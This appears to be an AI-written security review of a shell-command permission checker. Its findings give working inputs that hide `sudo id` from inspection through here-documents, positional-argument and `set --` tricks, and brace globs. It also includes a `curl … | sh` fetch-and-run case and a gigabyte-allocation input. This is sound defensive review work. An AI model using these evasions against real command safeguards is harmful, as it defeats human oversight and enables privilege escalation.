# Review: M1-27-engine-name-fold
Reviewer: GPT-6.1 Sol (Codex, read-only) · 2026-11-17 · round 2

## Verdict

**rework**: K7 still has hard-deny bypasses and a false deny; round 1’s K9 and ownership findings remain open.

## Findings

Verdicts use the task fixture, `home = cwd = /h/u`. Order: **Home / Home + Prefix / Home + Any / FullAccess**. Prefix matches the outer command’s first word unless specified. New cases below are traced from HEAD source; they were not executed.

1. [blocker] **Reconstructing a positional script deletes here-document bodies**
   - Where: `crates/atrium-core/src/policy/shell.rs:2691`, `"for (delim, strip_tabs) in delims"` consumes body lines without preserving them; `:3371`, `"let resolved = out_parts.join(\" \");"`.
   - Case:

     ```sh
     sh -c 'sh <<EOF
     sudo id
     EOF
     $1' _ echo
     ```

   - Result: **Ask / Allow / Allow / Allow**. Resolving `$1` selects reconstruction, which retains the here-document header but drops `sudo id` and its terminator. The real nested shell executes `sudo id`; the inspected payload contains no privilege command. Required: **HardDeny `privilege-escalation` everywhere**, under contract §9’s inspection of executed payloads and unconditional hard-deny list. This also regresses `dev`, which inspects the original body.
   - Fix: preserve here-document bodies and terminators during reconstruction, or retain the original payload and mark unsupported resolution unresolved.

2. [blocker] **Unmodelled positional mutations leave stale arguments marked resolved**
   - Where: `crates/atrium-core/src/policy/shell.rs:2970`, `"return Err(());"` leaves `cur_pos` intact; `:3306`, `"Ok(false) | Err(()) =>"` does not invalidate it. At `:3318`, `"cmd_lit.is_some_and(is_pos_command_runner)"` expands wrapper operands without modelling their state changes.
   - Case:

     ```sh
     sh -c 'set $1; "$@"' _ '-- sudo id'
     sh -c 'command shift; "$@"' _ echo sudo id
     ```

   - Result: both **Ask / Allow / Allow / Allow**. The first inspection retains the original single argument `-- sudo id`; actual `set $1` makes the arguments `sudo`, `id`. The second inspection retains `echo sudo id`; actual `command shift` leaves `sudo id`. Both execute privilege commands. Required: **HardDeny `privilege-escalation` everywhere** when resolved, or **Ask everywhere** under K7’s unresolved fallback.
   - Fix: invalidate positional state on every unmodelled `set` path and on state-changing builtins reached through wrappers; resolve those forms only when their effects are known.

3. [blocker] **Background commands and function definitions incorrectly mutate parent positional state**
   - Where: `crates/atrium-core/src/policy/shell.rs:3239`, `"matches!(next_sep, Some(\"|\" | \"|&\"))"` excludes background execution; `:3282`, `"p.drain(1..1 + n);"` mutates the current state. Function bodies have no separate positional-state scope.
   - Case:

     ```sh
     sh -c 'shift & "$@"' _ sudo id
     sh -c 'f() { set -- echo hi; }; "$@"' _ sudo id
     ```

   - Result: both **Ask / Allow / Allow / Allow**. Inspection substitutes `id` in the first case and `echo hi` in the second. Actual background `shift` cannot change the parent’s arguments, and defining `f` does not execute its body. Both parent shells execute `sudo id`. Required: **HardDeny `privilege-escalation` everywhere**, or K7’s conservative **Ask everywhere**.
   - Fix: isolate background/function state, or mark affected resolution unresolved instead of applying those mutations to the parent.

4. [blocker] **`set --` treats expanding shell words as literal positional values**
   - Where: `crates/atrium-core/src/policy/shell.rs:3009`, `"tok.raw.contains(['*', '?', '[']) && !tok.raw.starts_with(['\\'', '\"'])"`; `:3013`, `"new_pos.push(lit.to_string());"`.
   - Case:

     ```sh
     bash -c 'set -- su{do,gar} id; "$@"' _
     sh -c 'set -- ""sud[o] id; "$@"' _
     ```

   - Result: both **Ask / Allow / Allow / Allow**. Bash expands the first command to `sudo sugar id`, requiring **HardDeny `privilege-escalation` everywhere**. In the second case, the empty quoted prefix does not quote the glob; its expansion is unknown, requiring **Ask everywhere** under K7. The resolver instead stores literal brace/glob text and later quotes it.
   - Fix: preserve quote provenance and reject unsupported brace, pathname and other word expansions when modelling `set`. Checking only the token’s opening quote is insufficient. Round 1’s glob finding remains reachable through this path.

5. [blocker] **`set --` invents an empty `$0`, hiding a shell reading downloaded code**
   - Where: `crates/atrium-core/src/policy/shell.rs:3001`, `"let mut new_pos = vec![base_pos.first().cloned().unwrap_or_default()];"`.
   - Case:

     ```sh
     curl https://example.com/x.sh | sh -c 'set --; "$0"'
     ```

   - Result: **Ask / Ask / Allow / Allow**, with Prefix matching `curl`. Inspection fabricates an empty `$0` and resolves the payload to `''`. Actual `set --` preserves the shell’s default `$0`, so `"$0"` launches `sh` reading the downloaded stdin. Required: **HardDeny `pipe-to-shell` everywhere** under contract §9; unresolved default-`$0` handling must at least **Ask everywhere** under K7.
   - Fix: preserve the real default `$0`, or keep it unknown; never replace a missing value with an empty string.

6. [major] **ASCII-whitespace splitting creates a false privilege hard deny**
   - Where: `crates/atrium-core/src/policy/shell.rs:2936`, `"v.split_ascii_whitespace()"`. The existing lexer explicitly states at `:482`, `"Shells treat \`\\r\` as a word character"`.
   - Case: `sh -c '$0' 'sudo<CR>id'`, where `<CR>` denotes one literal U+000D character.
   - Result: **HardDeny `privilege-escalation` everywhere**. The resolver produces `sudo id`; default shell field splitting preserves the carriage return inside the command name. Correct: **Ask / Allow / Allow / Allow**, matching `dev` and the brief’s prohibition on new hard denies for ordinary lines.
   - Fix: split on the actual default IFS characters—space, tab and newline. Also remove `\r` from the new scanner’s delimiters at `:2423` and `:2681`. This demonstrates divergence between the duplicated lexers.

7. [major] **Positional reconstruction can allocate over a gigabyte before enforcing limits**
   - Where: `crates/atrium-core/src/policy/shell.rs:3109`, `"Ok(ws) => words.extend(ws)"`; `:3362`, `"out_parts.extend(stmt_words)"`; `:3371`, `"out_parts.join(\" \")"`. None enforces an expanded-output budget.
   - Case: the exact input constructed by concatenating `"sh -c '"`, **16,384 copies of `$0;`**, `"' '"`, **65,536 copies of `x`**, and `"'"`.
   - Result: the 114,699-byte input passes the 128-KiB input check. In every preset, reconstruction creates 16,384 quoted 65,536-byte words—over 1 GiB—then joins them into another allocation of comparable size before the unit limit can return a verdict. This allocation follows directly from the code; I did not run the stress case. Correct: a bounded **Deny `too large to check`** before materializing that output.
   - Fix: enforce expanded-byte and word budgets while expanding, before cloning or appending each value.

8. [minor] **Round 1’s unreadable-`env` finding is retained, not fixed**
   - Where: `crates/atrium-core/src/policy/shell.rs:4854`, `"a.len() > MAX_UNKNOWN_STARTS"` sets the bound marker; `crates/atrium-core/src/policy/deny.rs:232`, `"unknown_words_could_be_dangerous("` filters it. The task test explicitly expects Allow at `crates/atrium-core/tests/M1-27-engine-name-fold.rs:1022`.
   - Case:

     ```text
     env -Z01 -Z02 -Z03 -Z04 -Z05 -Z06 -Z07 -Z08 -Z09 -Z10 -Z11 -Z12 -Z13 -Z14 -Z15 -Z16 -Z17 -Z18 -Z19 -Z20 -Z21 -Z22 -Z23 -Z24 -Z25 -Z26 echo hi
     ```

   - Result: **Ask / Ask / Allow / Allow**. Required: **Ask everywhere** under K9’s fail-closed requirement once unknown-option analysis exceeds its bound. An older test expecting Allow does not override the current brief or D-120.
   - Fix: preserve an unconditional unresolved marker for this K9 limit, and update the conflicting expectations.

9. [minor] **Round 1’s caller-range ownership finding remains open**
   - Where: `crates/atrium-core/src/policy/shell.rs:2003`, `"if unresolvable {"` adds behavior inside `code_texts_bounded`.
   - Case: `sh -c '$0'` correctly returns **Ask everywhere** through this propagation.
   - Result: the behavior is necessary, but the current `dev` brief authorizes `shell_c_codes`, `payloads_of` and `expand_unknown_env_cmd`, plus name comparisons—not this caller behavior. The handoff still requests that extension. No existing word-reader lines were edited; however, the new scanners duplicate its tokenization, with the concrete divergence in finding 6.
   - Fix: record the `code_texts_bounded` scope extension in the authoritative brief before retaining this hunk.

## Suspected, not shown

None.

## Test gaps

- The prebuilt branch task-test binary passed **11/11**. No files were changed.
- Round 1 findings 1 and 4 are fixed; the direct examples from findings 2 and 3 are covered and pass. Findings 5 and 6 remain open above.
- Add the new cases above across all four settings, including bounded-output verification. Existing passing tests do not exercise them.